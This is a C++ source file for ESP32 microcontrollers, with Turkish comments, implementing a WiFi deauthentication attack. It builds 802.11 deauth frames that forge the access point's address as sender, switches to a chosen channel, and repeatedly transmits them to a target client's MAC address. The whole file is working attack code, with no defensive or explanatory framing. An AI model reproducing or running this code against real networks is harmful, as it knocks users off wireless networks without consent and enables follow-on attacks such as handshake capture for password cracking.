#include "wifi_deauth.h"

#include <WiFi.h>
#include <cstdio>
#include <cstring>
#include <esp_wifi.h>

namespace {
// 802.11 deauthentication çerçevesi: 24 baytlık standart yönetim başlığı +
// 2 baytlık gövde (Reason Code). Tüm alanlar zaten çift bayt sınırlarında
// olduğu için doğal hizalamada da paketlenmiş boyutla (26 bayt) aynı
// çıkıyor; "packed" niyeti açık belirtmek için yine de ekleniyor.
struct __attribute__((packed)) DeauthFrame {
  uint16_t frameControl;
  uint16_t duration;
  uint8_t destAddr[6];
  uint8_t srcAddr[6];
  uint8_t bssid[6];
  uint16_t seqControl;
  uint16_t reasonCode;
};
}  // namespace

void WifiDeauth::begin() {
  // Çerçeve her sendDeauth() çağrısında ayrı hazırlanıp gönderiliyor;
  // burada ek bir başlatma gerekmiyor.
}

bool WifiDeauth::parseMacAddress(const char *str, uint8_t out[6]) {
  if (str == nullptr) {
    return false;
  }

  unsigned int bytes[6];
  int matched = sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x", &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4],
                        &bytes[5]);
  if (matched != 6) {
    return false;
  }

  for (int i = 0; i < 6; i++) {
    out[i] = static_cast<uint8_t>(bytes[i]);
  }
  return true;
}

uint16_t WifiDeauth::sendDeauth(const uint8_t bssid[6], const uint8_t clientMac[6], uint8_t channel,
                                 uint16_t frameCount) {
  if (frameCount > kMaxFrameCount) {
    frameCount = kMaxFrameCount;
  }

  WiFi.mode(WIFI_STA);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  DeauthFrame frame = {};
  frame.frameControl = 0x00C0;  // Type=Management(00), Subtype=Deauthentication(1100)
  frame.duration = 0;
  memcpy(frame.destAddr, clientMac, 6);
  memcpy(frame.srcAddr, bssid, 6);  // AP'nin kendisinden geliyormuş gibi (deauth çerçevesinin standart biçimi)
  memcpy(frame.bssid, bssid, 6);
  frame.reasonCode = 7;  // "Class 3 frame received from nonassociated station" — yaygın kullanılan bir sebep kodu

  uint16_t sent = 0;
  for (uint16_t i = 0; i < frameCount; i++) {
    frame.seqControl = i << 4;
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
    if (err == ESP_OK) {
      sent++;
    }
    delay(5);
  }

  return sent;
}
